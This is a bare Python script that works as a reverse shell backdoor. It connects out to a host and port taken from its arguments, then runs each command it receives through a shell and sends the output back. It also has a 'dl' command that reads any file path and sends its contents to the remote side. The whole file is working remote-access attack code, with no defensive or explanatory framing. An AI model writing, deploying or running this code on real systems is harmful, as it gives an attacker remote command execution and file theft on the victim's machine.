try:
    import socket, subprocess as sp,sys, os, locale
except:
    pass
locenc = locale.getpreferredencoding()
try :
    host = sys.argv[1]
except :
    host='localhost'   
try: 
    port= int(sys.argv[2])
except:
    port=8080
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host,port))
while True:
    command = conn.recv(1024).decode("utf-8")
    if command != "exit":
        if command.startswith("dl") :
            file_path = command.split("#")[1]
            with open(file_path,"rb") as file :
                data = file.read()
                conn.sendall(data)
        elif command.startswith('cd') :
            try:
                os.chdir(command.split(' ')[1])
            except Exception as e :
                pass #print(e)
        else :
            sh = sp.Popen(command, shell=True,
                          stdout=sp.PIPE,
                          stderr=sp.PIPE,
                          stdin=sp.PIPE)
            out, err = sh.communicate()
            result = out.decode(locenc) + err.decode(locenc)
            conn.sendall(bytes(result,encoding='utf-8'))
    else :
        break
conn.close()
        
